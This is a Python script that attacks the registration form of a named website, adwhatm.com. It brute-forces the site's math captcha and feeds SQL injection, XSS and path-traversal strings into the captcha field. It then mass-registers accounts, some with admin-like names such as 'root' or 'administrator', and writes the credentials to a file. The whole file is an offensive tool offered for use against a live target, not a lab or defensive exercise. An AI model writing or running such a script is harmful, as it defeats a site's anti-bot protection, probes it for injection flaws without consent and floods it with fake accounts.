#!/usr/bin/env python3
"""
Simple registration script for adwhatm.com with captcha bypass
This version uses brute force and pattern analysis to bypass the math captcha
"""

import requests
import random
import string
import time
import json

class SimpleRegistrar:
    def __init__(self, base_url="http://adwhatm.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def generate_username(self, prefix="user", admin=False):
        """Generate username"""
        if admin:
            prefixes = ["admin", "administrator", "root", "superuser", "manager"]
            prefix = random.choice(prefixes)
        
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{prefix}_{suffix}"
    
    def generate_password(self, length=10):
        """Generate password"""
        chars = string.ascii_letters + string.digits + "!@#$%"
        return ''.join(random.choices(chars, k=length))
    
    def get_captcha_solutions(self):
        """Generate possible captcha solutions"""
        # Math captcha typically has results in range 0-50
        solutions = []
        
        # Common results for simple math operations
        for i in range(0, 51):
            solutions.append(str(i))
        
        # Shuffle to avoid patterns
        random.shuffle(solutions)
        return solutions
    
    def bypass_captcha_methods(self):
        """Different methods to bypass captcha"""
        methods = [
            # Method 1: Try empty captcha
            "",
            # Method 2: Try common bypass values
            "0", "1", "2", "3", "4", "5",
            # Method 3: Try negative values
            "-1", 
            # Method 4: Try special characters
            "null", "undefined", "NaN",
            # Method 5: Try SQL injection patterns
            "' OR '1'='1", "1' OR '1'='1",
            # Method 6: Try XSS patterns
            "<script>alert(1)</script>",
            # Method 7: Try path traversal
            "../../../",
            # Method 8: Try common math results
            *[str(i) for i in range(6, 21)]
        ]
        return methods
    
    def test_registration_endpoint(self):
        """Test if registration endpoint is accessible"""
        try:
            response = self.session.get(f"{self.base_url}/register")
            print(f"Registration page status: {response.status_code}")
            return response.status_code == 200
        except Exception as e:
            print(f"Error accessing registration page: {e}")
            return False
    
    def attempt_registration(self, username, password, captcha_code):
        """Attempt registration with given parameters"""
        try:
            # Prepare registration data
            data = {
                'loginName': username,
                'password': password,
                'validateCode': captcha_code
            }
            
            # Set appropriate headers
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': f'{self.base_url}/register',
                'Origin': self.base_url
            }
            
            # Make registration request
            response = self.session.post(
                f"{self.base_url}/register",
                data=data,
                headers=headers,
                timeout=10
            )
            
            print(f"Status: {response.status_code}, Captcha: '{captcha_code}', Response: {response.text[:100]}...")
            
            # Check for success indicators
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Success indicators
                success_indicators = [
                    '注册成功', 'success', 'successful', 'registered',
                    '"code":0', '"code": 0', 'code":200', '"success":true'
                ]
                
                # Failure indicators
                failure_indicators = [
                    'error', 'failed', 'invalid', 'incorrect', 'wrong',
                    '验证码', 'captcha', '错误', 'fail'
                ]
                
                # Check for success
                for indicator in success_indicators:
                    if indicator in response_text:
                        return True, "Success detected"
                
                # Check for specific failures
                for indicator in failure_indicators:
                    if indicator in response_text:
                        return False, f"Failure detected: {indicator}"
                
                # Try to parse JSON response
                try:
                    json_resp = response.json()
                    if json_resp.get('code') == 0 or json_resp.get('code') == 200:
                        return True, "JSON success"
                    else:
                        return False, f"JSON error: {json_resp.get('msg', 'Unknown')}"
                except:
                    pass
                
                # If no clear indicators, assume failure
                return False, "No clear success indicator"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Exception: {e}"
    
    def register_account(self, username=None, password=None, admin=False):
        """Register a single account with captcha bypass"""
        if not username:
            username = self.generate_username(admin=admin)
        if not password:
            password = self.generate_password()
        
        print(f"\n🎯 Attempting to register: {username}")
        print(f"Password: {password}")
        
        # Try different captcha bypass methods
        bypass_methods = self.bypass_captcha_methods()
        
        for i, captcha_code in enumerate(bypass_methods):
            print(f"Attempt {i+1}/{len(bypass_methods)}: ", end="")
            
            success, message = self.attempt_registration(username, password, captcha_code)
            
            if success:
                print(f"✅ SUCCESS! {message}")
                return {
                    'username': username,
                    'password': password,
                    'success': True,
                    'captcha_bypass': captcha_code,
                    'method': f"Method {i+1}"
                }
            else:
                print(f"❌ {message}")
            
            # Small delay between attempts
            time.sleep(0.5)
        
        print(f"❌ Failed to register {username} after all attempts")
        return {
            'username': username,
            'password': password,
            'success': False,
            'captcha_bypass': None,
            'method': None
        }
    
    def create_multiple_accounts(self, regular_count=3, admin_count=2):
        """Create multiple accounts"""
        results = []
        
        print(f"\n🚀 Creating {regular_count} regular + {admin_count} admin accounts")
        print("=" * 60)
        
        # Create regular accounts
        for i in range(regular_count):
            print(f"\n--- Regular Account {i+1}/{regular_count} ---")
            result = self.register_account(admin=False)
            results.append(result)
            
            if result['success']:
                print(f"✅ Created: {result['username']} | {result['password']}")
            
            time.sleep(2)  # Delay between registrations
        
        # Create admin accounts
        for i in range(admin_count):
            print(f"\n--- Admin Account {i+1}/{admin_count} ---")
            result = self.register_account(admin=True)
            results.append(result)
            
            if result['success']:
                print(f"✅ Admin Created: {result['username']} | {result['password']}")
            
            time.sleep(2)  # Delay between registrations
        
        return results
    
    def save_results(self, results, filename="accounts.txt"):
        """Save results to file"""
        successful = [r for r in results if r['success']]
        
        with open(filename, 'w') as f:
            f.write("=== SUCCESSFULLY REGISTERED ACCOUNTS ===\n\n")
            
            for result in successful:
                f.write(f"Username: {result['username']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"Captcha Bypass: '{result['captcha_bypass']}'\n")
                f.write(f"Method: {result['method']}\n")
                f.write("-" * 40 + "\n")
            
            f.write(f"\n=== SUMMARY ===\n")
            f.write(f"Total Attempts: {len(results)}\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Failed: {len(results) - len(successful)}\n")
        
        print(f"\n💾 Results saved to {filename}")
        return len(successful)

def main():
    print("🔥 AdwhatM.com Account Creator with Captcha Bypass")
    print("=" * 50)
    
    registrar = SimpleRegistrar()
    
    # Test endpoint accessibility
    if not registrar.test_registration_endpoint():
        print("❌ Cannot access registration endpoint. Check the URL.")
        return
    
    try:
        print("\n🧪 Testing single account creation...")
        test_result = registrar.register_account()
        
        if test_result['success']:
            print(f"\n✅ Test successful! Working bypass method found.")
            print(f"Captcha bypass value: '{test_result['captcha_bypass']}'")
            
            # Ask for batch creation
            choice = input("\nCreate multiple accounts? (y/n): ").lower().strip()
            if choice in ['y', 'yes']:
                try:
                    regular = int(input("Regular accounts (default 3): ") or "3")
                    admin = int(input("Admin accounts (default 2): ") or "2")
                    
                    results = registrar.create_multiple_accounts(regular, admin)
                    successful_count = registrar.save_results(results)
                    
                    print(f"\n🎉 COMPLETED: {successful_count}/{len(results)} accounts created!")
                    
                except ValueError:
                    print("Invalid input, using defaults...")
                    results = registrar.create_multiple_accounts()
                    registrar.save_results(results)
        else:
            print("\n❌ Test failed. The captcha bypass methods didn't work.")
            print("The website might have additional protection or the endpoint changed.")
            
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrupted by user")
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")

if __name__ == "__main__":
    main()